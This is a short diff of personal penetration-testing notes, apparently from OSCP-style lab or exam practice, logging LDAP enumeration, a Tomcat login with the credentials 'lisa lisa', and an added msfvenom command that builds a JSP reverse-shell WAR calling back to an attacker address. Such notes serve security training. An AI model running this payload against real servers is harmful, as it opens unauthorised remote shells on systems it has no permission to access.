@@ -24,6 +24,12 @@ ldapsearch -x -b "dc=oscp,dc=exam" "*" -H ldap://192.168.102.100  | awk '/dn: / 
 
 tried with lisa lisa on tomcat , got the access
 
+created msfvenom shell
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.49.102 LPORT=8080 -f war -o revshell_jsp.war
+
+logged into tomcat with lisa lisa 
+
 
 
 192.168.102.100 - entry point
